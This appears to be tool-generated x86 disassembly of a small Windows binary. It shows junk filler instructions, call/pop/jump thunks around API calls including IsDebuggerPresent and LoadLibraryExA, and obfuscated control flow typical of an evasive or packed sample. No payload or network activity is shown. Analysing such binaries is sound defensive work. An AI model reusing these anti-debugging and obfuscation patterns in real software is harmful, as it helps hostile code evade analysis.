0x004c1044:	addb	%al, (%eax)	; from: 0x004c1428(MAY)
0x004c1046:	addb	%al, (%eax)
0x004c1048:	addb	%al, (%eax)
0x004c104a:	addb	%al, (%eax)
0x004c104c:	addb	%al, (%eax)
0x004c104e:	addb	%al, (%eax)
0x004c1050:	addb	%al, (%eax)
0x004c1052:	addb	%al, (%eax)
0x004c1054:	addb	%al, (%eax)
0x004c1056:	addb	%al, (%eax)
0x004c1058:	addb	%al, (%eax)
0x004c105a:	addb	%al, (%eax)
0x004c105c:	addb	%al, (%eax)
0x004c105e:	addb	%al, (%eax)
0x004c1060:	addb	%al, (%eax)
0x004c1062:	addb	%al, (%eax)
0x004c1064:	addb	%al, (%eax)
0x004c1066:	addb	%al, (%eax)
0x004c1068:	addb	%al, (%eax)
0x004c106a:	addb	%al, (%eax)
0x004c106c:	addb	%al, (%eax)
0x004c106e:	addb	%al, (%eax)
0x004c1070:	addb	%al, (%eax)
0x004c1072:	addb	%al, (%eax)
0x004c1074:	addb	%al, (%eax)
0x004c1076:	addb	%al, (%eax)
0x004c1078:	addb	%al, (%eax)
0x004c107a:	addb	%al, (%eax)
0x004c107c:	addb	%al, (%eax)
0x004c107e:	addb	%al, (%eax)
0x004c1080:	addb	%al, (%eax)
0x004c1082:	addb	%al, (%eax)
0x004c1084:	addb	%al, (%eax)
0x004c1086:	addb	%al, (%eax)
0x004c1088:	addb	%al, (%eax)
0x004c108a:	addb	%al, (%eax)
0x004c108c:	addb	%al, (%eax)
0x004c108e:	addb	%al, (%eax)
0x004c1090:	addb	%al, (%eax)
0x004c1092:	addb	%al, (%eax)
0x004c1094:	addb	%al, (%eax)
0x004c1096:	addb	%al, (%eax)
0x004c1098:	addb	%al, (%eax)
0x004c109a:	addb	%al, (%eax)
0x004c109c:	addb	%al, (%eax)
0x004c109e:	addb	%al, (%eax)
0x004c10a0:	addb	%al, (%eax)
0x004c10a2:	addb	%al, (%eax)
0x004c10a4:	addb	%al, (%eax)
0x004c10a6:	addb	%al, (%eax)
0x004c10a8:	addb	%al, (%eax)
0x004c10aa:	addb	%al, (%eax)
0x004c10ac:	movl	%edi, %edi	; from: 0x004c14ca(MAY)
0x004c10ae:	pushl	%ebp
0x004c10af:	movl	%esp, %ebp
0x004c10b1:	subl	$0x5c, %esp
0x004c10b4:	leal	0x004c3094, %ecx
0x004c10ba:	subl	0x74(%ecx), %edi
0x004c10bd:	pushl	%ecx
0x004c10be:	pushl	0x34(%ecx)
0x004c10c1:	pushl	%edi
0x004c10c2:	call	0x004c1758	; targets: 0x004c1758(MAY)
0x004c10f4:	popl	%esi	; from: 0x004c149d(MAY)
0x004c10f5:	call	IsDebuggerPresent@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004c10fb:	repz jmp	%esi	; targets: 0x004c14a2(MAY)
0x004c12dc:	movl	%edi, %edi	; from: 0x004c19a9(MAY)
0x004c12de:	pushl	%ebp
0x004c12df:	movl	%esp, %ebp
0x004c12e1:	subl	$0x58, %esp
0x004c12e4:	leal	0x004c31ec, %edx
0x004c12ea:	orl	-288(%edx), %esi
0x004c12f0:	pushl	%edx
0x004c12f1:	pushl	%ebx
0x004c12f2:	pushl	0x34(%edx)
0x004c12f5:	pushl	%esi
0x004c12f6:	call	0x004c1344	; targets: 0x004c1344(MAY)
0x004c1320:	popl	%esi	; from: 0x004c1495(MAY)
0x004c1321:	call	CreateMailslotA@kernel32.dll	; targets: 0xff0001e0(MAY)
0x004c1327:	repz jmp	%esi	; targets: 0x004c149a(MAY)
0x004c1344:	movl	%edi, %edi	; from: 0x004c12f6(MAY)
0x004c1346:	pushl	%ebp
0x004c1347:	movl	%esp, %ebp
0x004c1349:	subl	$0x48, %esp
0x004c134c:	leal	0x10(%edx), %esi
0x004c134f:	movl	%esi, -28(%ebp)
0x004c1352:	pushl	%esi
0x004c1353:	movl	$0x0, %ecx
0x004c1358:	pushl	%ecx
0x004c1359:	call	0x004c18b0	; targets: 0x004c18b0(MAY)
0x004c135e:	popl	%esi	; from: 0x004c18b7(MAY)
0x004c135f:	pushl	%esi
0x004c1360:	pushl	%edx
0x004c1361:	pushl	0xe4(%esi)
0x004c1367:	call	0x004c1540	; targets: 0x004c1540(MAY)
0x004c1408:	movl	%edi, %edi	; from: 0x004c1576(MAY)
0x004c140a:	pushl	%ebp
0x004c140b:	movl	%esp, %ebp
0x004c140d:	subl	$0x60, %esp
0x004c1410:	movl	$0x4c31a0, %ecx
0x004c1415:	orl	$0xffffff9b, -176(%ecx)
0x004c141c:	pushl	%ecx
0x004c141d:	pushl	$0x0
0x004c141f:	call	0x004c1a30	; targets: 0x004c1a30(MAY)
0x004c1424:	popl	%ecx	; from: 0x004c1a37(MAY)
0x004c1425:	pushl	%ecx
0x004c1426:	pushl	%edi
0x004c1427:	pushl	%esi
0x004c1428:	call	0x004c1044	; targets: 0x004c1044(MAY)

start:
0x004c148c:	pushl	%esi
0x004c148d:	pushl	$0x0
0x004c148f:	pushl	$0x0
0x004c1491:	pushl	$0x0
0x004c1493:	pushl	$0x0
0x004c1495:	call	0x004c1320	; targets: 0x004c1320(MAY)
0x004c149a:	subl	$0x0, %esp	; from: 0x004c1327(MAY)
0x004c149d:	call	0x004c10f4	; targets: 0x004c10f4(MAY)
0x004c14a2:	pushl	$0x2	; from: 0x004c10fb(MAY)
0x004c14a4:	pushl	$0x0
0x004c14a6:	decl	0x004c30a8
0x004c14ac:	movl	$0x4c30a0, %eax
0x004c14b1:	pushl	%eax
0x004c14b2:	call	0x004c1b70	; targets: 0x004c1b70(MAY)
0x004c14b7:	popl	%esi	; from: 0x004c1b77(MAY)
0x004c14b8:	movl	0x3b(%eax), %edx
0x004c14bb:	leal	(%eax,%edx), %eax
0x004c14be:	addl	$0x28, %eax
0x004c14c1:	movl	(%eax), %eax
0x004c14c3:	pusha	
0x004c14c4:	movb	$0x50, %ah
0x004c14c6:	subb	%ah, %al
0x004c14c8:	jb	0x004c14d0	; targets: 0x004c14d0(MAY), 0x004c14ca(MAY)
0x004c14ca:	jg	0x004c10ac	; targets: 0x004c14d0(MAY), 0x004c10ac(MAY)	; from: 0x004c14c8(MAY)
0x004c14d0:	popa		; from: 0x004c14c8(MAY), 0x004c14ca(MAY)
0x004c14d1:	ret	; targets: 0xfee70000(MAY)

0x004c1540:	movl	%edi, %edi	; from: 0x004c1367(MAY)
0x004c1542:	pushl	%ebp
0x004c1543:	movl	%esp, %ebp
0x004c1545:	subl	$0x60, %esp
0x004c1548:	leal	0x004c3010, %eax
0x004c154e:	cmpl	$0x1819, %eax
0x004c1553:	je	0x004c1543	; targets: 0x004c1555(MAY)
0x004c1555:	pushl	%eax	; from: 0x004c1553(MAY)
0x004c1556:	movl	$0xfffffff4, %ecx
0x004c155b:	pushl	%ecx
0x004c155c:	call	0x004c1590	; targets: 0x004c1590(MAY)
0x004c1561:	popl	%eax	; from: 0x004c1597(MAY)
0x004c1562:	pushl	%eax
0x004c1563:	pushl	0xd0(%eax)
0x004c1569:	pushl	0xa0(%eax)
0x004c156f:	pushl	%edi
0x004c1570:	pushl	0x1bc(%eax)
0x004c1576:	call	0x004c1408	; targets: 0x004c1408(MAY)
0x004c1590:	popl	%esi	; from: 0x004c155c(MAY)
0x004c1591:	call	GetStdHandle@kernel32.dll	; targets: 0xff000160(MAY)
0x004c1597:	repz jmp	%esi	; targets: 0x004c1561(MAY)
0x004c1758:	movl	%edi, %edi	; from: 0x004c10c2(MAY)
0x004c175a:	pushl	%ebp
0x004c175b:	movl	%esp, %ebp
0x004c175d:	subl	$0x50, %esp
0x004c1760:	leal	0x004c3040, %eax
0x004c1766:	andl	%edx, -44(%ebp)
0x004c1769:	pushl	%eax
0x004c176a:	pushl	%ebx
0x004c176b:	pushl	%ecx
0x004c176c:	pushl	0x1b8(%eax)
0x004c1772:	pushl	%ecx
0x004c1773:	call	0x004c1990	; targets: 0x004c1990(MAY)
0x004c18b0:	popl	%esi	; from: 0x004c1359(MAY)
0x004c18b1:	call	GetDC@user32.dll	; targets: 0xff000010(MAY)
0x004c18b7:	repz jmp	%esi	; targets: 0x004c135e(MAY)
0x004c1990:	movl	%edi, %edi	; from: 0x004c1773(MAY)
0x004c1992:	pushl	%ebp
0x004c1993:	movl	%esp, %ebp
0x004c1995:	subl	$0x3c, %esp
0x004c1998:	movl	$0x4c3140, %esi
0x004c199d:	orl	-32(%ebp), %edx
0x004c19a0:	pushl	%esi
0x004c19a1:	pushl	0x1f4(%esi)
0x004c19a7:	pushl	%edx
0x004c19a8:	pushl	%ebx
0x004c19a9:	call	0x004c12dc	; targets: 0x004c12dc(MAY)
0x004c1a30:	popl	%esi	; from: 0x004c141f(MAY)
0x004c1a31:	call	FindClose@kernel32.dll	; targets: 0xff000100(MAY)
0x004c1a37:	repz jmp	%esi	; targets: 0x004c1424(MAY)
0x004c1b70:	popl	%esi	; from: 0x004c14b2(MAY)
0x004c1b71:	call	LoadLibraryExA@kernel32.dll	; targets: 0xff0000a0(MAY)
0x004c1b77:	repz jmp	%esi	; targets: 0x004c14b7(MAY)
